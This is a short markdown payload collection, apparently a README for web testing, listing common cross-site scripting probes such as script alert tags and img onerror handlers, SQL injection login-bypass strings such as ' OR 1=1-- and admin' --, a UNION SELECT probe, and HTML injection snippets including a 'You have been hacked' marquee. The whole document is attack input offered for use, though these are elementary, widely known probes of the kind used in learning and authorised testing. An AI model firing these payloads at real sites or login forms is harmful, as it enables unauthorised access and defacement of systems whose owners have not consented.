# 💣 Payload Collection

Click to expand each section 👇

---

<details>
<summary>🔍 XSS Payloads</summary>

<script>alert(1)</script> <script>alert('XSS')</script> <script>alert('this is dangerous')</script> <img src=x onerror=alert(1)> <img src=x onerror=alert('XSS')>

<svg/onload=alert(1)>

"><script>alert(1)</script>

javascript:alert(1)


</details>

---

<details>
<summary>💉 SQL Injection Payloads</summary>

' OR 1=1--
' OR '1'='1
" OR "1"="1
'or 1=1 --

admin' --
admin' #

' OR 1=1#
' OR 1=1/*

' UNION SELECT NULL,NULL--


</details>

---

<details>
<summary>🧪 HTML Injection Payloads</summary>

```html
<h1>Hacked</h1>
<b>This is injected content</b>
<img src="https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg">
<div style="color:red;">Injected HTML</div>
<marquee>You have been hacked</marquee>
```
